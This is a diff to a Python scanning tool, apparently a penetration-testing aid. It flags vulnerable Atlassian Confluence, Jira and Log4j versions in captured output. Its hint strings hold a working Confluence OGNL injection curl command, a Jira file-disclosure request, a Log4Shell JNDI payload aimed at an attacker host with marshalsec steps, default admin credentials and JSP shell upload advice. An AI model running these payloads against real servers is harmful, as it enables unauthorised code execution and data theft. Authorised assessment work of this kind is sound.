@@ -1940,6 +1940,32 @@ _AJP_GNMAP = re.compile(
     r'(?i)Host:\s+([\w.:]+)[^\r\n]*8009/open/tcp//ajp13?/'
 )
 
+# iter-234: modern web-app version-banner CVE hints. Payload IOCs
+# for Log4Shell/Spring4Shell/Confluence OGNL are already covered by
+# per-line matchers; missing was the DEFENDER-side signal - captured
+# version banner or dependency listing revealing a vulnerable build.
+#
+# Confluence: nmap prints `Atlassian Confluence X.Y.Z` or the login
+# page HTML has `Confluence X.Y.Z` in the footer.
+_CONFLUENCE_VERSION = re.compile(
+    r'(?i)Atlassian\s+Confluence[^\r\n]{0,80}?(\d+\.\d+(?:\.\d+)?)'
+)
+# Jira: similar shape.
+_JIRA_VERSION = re.compile(
+    r'(?i)Atlassian\s+Jira[^\r\n]{0,80}?(\d+\.\d+(?:\.\d+)?)'
+)
+# Log4j: version in jar listing (from `find / -name log4j*`) or in
+# a maven / gradle dependency dump.
+_LOG4J_VERSION = re.compile(
+    r'(?i)log4j[- ](?:core[- ])?(\d+\.\d+(?:\.\d+)?)'
+)
+# Spring: `X-Application-Context: appname:profile:port` header is a
+# tell for Spring Boot; a captured Spring version banner is even
+# stronger.
+_SPRING_VERSION = re.compile(
+    r'(?i)spring[- ]?(?:framework|boot)?[- ]?(\d+\.\d+\.\d+)'
+)
+
 # iter-232: DNS zone transfer captured output (dig / dnsrecon / host).
 # Successful AXFR gives the operator a full internal-DNS listing:
 # hostnames, IPs, SRV records pointing at every service (KDC, LDAP,
@@ -3060,6 +3086,96 @@ def _multiline_passes(path, report, store):
                              + "  |  next: nmap --script *-enum,"
                                "smb-enum-* against each new host in the "
                                "listing"))
+
+    # iter-234: modern web-app version-banner CVE hints. Doc-file gate
+    # applies. One HIGH per (app, version) tuple.
+    if not filters.is_doc_file(path):
+        def _vtuple(s):
+            try:
+                return tuple(int(x) for x in (
+                    s.split(".") + ["0", "0"])[:3])
+            except (ValueError, IndexError):
+                return (0, 0, 0)
+
+        # Confluence version → CVE-2022-26134 OGNL check.
+        _conf_m = _CONFLUENCE_VERSION.search(text[:16384])
+        if _conf_m:
+            _cv = _conf_m.group(1)
+            _cvt = _vtuple(_cv)
+            _cve_line = ""
+            # Vulnerable ranges per Atlassian advisory:
+            # <7.4.17, 7.13.0-7.13.6, 7.14.0-7.14.2, 7.15.0-7.15.1,
+            # 7.16.0-7.16.3, 7.17.0-7.17.3, 7.18.0-7.18.0
+            if (_cvt < (7, 4, 17)
+                    or (_cvt >= (7, 13, 0) and _cvt < (7, 13, 7))
+                    or (_cvt >= (7, 14, 0) and _cvt < (7, 14, 3))
+                    or (_cvt >= (7, 15, 0) and _cvt < (7, 15, 2))
+                    or (_cvt >= (7, 16, 0) and _cvt < (7, 16, 4))
+                    or (_cvt >= (7, 17, 0) and _cvt < (7, 17, 4))
+                    or (_cvt == (7, 18, 0))):
+                _cve_line = ("  |  CVE-2022-26134 OGNL injection RCE: "
+                             "curl -s 'http://<host>/%24%7B(%23a%3D%40o"
+                             "rg.apache.commons.io.IOUtils%40toString("
+                             "%40java.lang.Runtime%40getRuntime().exec("
+                             "%22id%22).getInputStream())).(%40com.opens"
+                             "ymphony.webwork.ServletActionContext%40get"
+                             "Response().setHeader(%22X-Cmd%22%2C%23a))"
+                             "%7D/'")
+            report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_conf_m),
+                       f"Atlassian Confluence {_cv} exposed - version"
+                       f" banner captured",
+                       hint=(f"authed foothold: default creds "
+                             f"admin:admin / admin:confluence / "
+                             f"admin:password OR reuse discovered "
+                             f"creds  |  post-cred: /admin/plugins/"
+                             f"servlet/upm for plugin upload → JSP "
+                             f"shell{_cve_line}"))
+
+        # Jira version → CVE-2021-26086 file disclosure check.
+        _jira_m = _JIRA_VERSION.search(text[:16384])
+        if _jira_m:
+            _jv = _jira_m.group(1)
+            _jvt = _vtuple(_jv)
+            _jira_cve = ""
+            # Vulnerable: 8.5.0 <= v < 8.5.14, 8.13.0 <= v < 8.13.6,
+            # 8.14.0 <= v < 8.16.1
+            if ((_jvt >= (8, 5, 0) and _jvt < (8, 5, 14))
+                    or (_jvt >= (8, 13, 0) and _jvt < (8, 13, 6))
+                    or (_jvt >= (8, 14, 0) and _jvt < (8, 16, 1))):
+                _jira_cve = ("  |  CVE-2021-26086 file disclosure: "
+                             "curl -s 'http://<host>/s/thiswillnotwork/"
+                             "_/;/META-INF/maven/com.atlassian.jira/"
+                             "atlassian-jira-webapp/pom.xml'")
+            report.add("HIGH", "SECRET-SIDECHANNEL", path,
+                       _ln(_jira_m),
+                       f"Atlassian Jira {_jv} exposed - version banner "
+                       f"captured",
+                       hint=(f"anon paths: /rest/api/2/project (project "
+                             f"listing), /rest/api/2/user/picker?query="
+                             f"' (user enum), /issues/?filter=-4 (open "
+                             f"issues){_jira_cve}"))
+
+        # Log4j version → CVE-2021-44228 Log4Shell check.
+        _l4j_m = _LOG4J_VERSION.search(text[:16384])
+        if _l4j_m:
+            _lv = _l4j_m.group(1)
+            _lvt = _vtuple(_lv)
+            # Vulnerable: 2.0-beta9 <= v < 2.17.1 (with 2.12.4 for
+            # Java 7). Simple check: 2.x below 2.17.1.
+            if _lvt >= (2, 0, 0) and _lvt < (2, 17, 1):
+                report.add("HIGH", "SECRET-SIDECHANNEL", path,
+                           _ln(_l4j_m),
+                           f"Log4j {_lv} < 2.17.1 - CVE-2021-44228 "
+                           f"Log4Shell RCE candidate",
+                           hint=(f"JNDI trigger: any input reflected "
+                                 f"into a log line: `${{jndi:ldap://<"
+                                 f"attacker>/Exploit}}`  |  test "
+                                 f"vectors: User-Agent, Referer, "
+                                 f"X-Forwarded-For, X-Api-Version, "
+                                 f"query params, POST body  |  server "
+                                 f"side: use marshalsec-0.0.3-SNAPSHOT-"
+                                 f"all.jar with LDAPRefServer +"
+                                 f" Exploit.class payload"))
 
     # iter-199: OpenSSH banner detection + CVE range flags. Emits INFO
     # RECON per unique version + a HIGH marker for each known-vulnerable
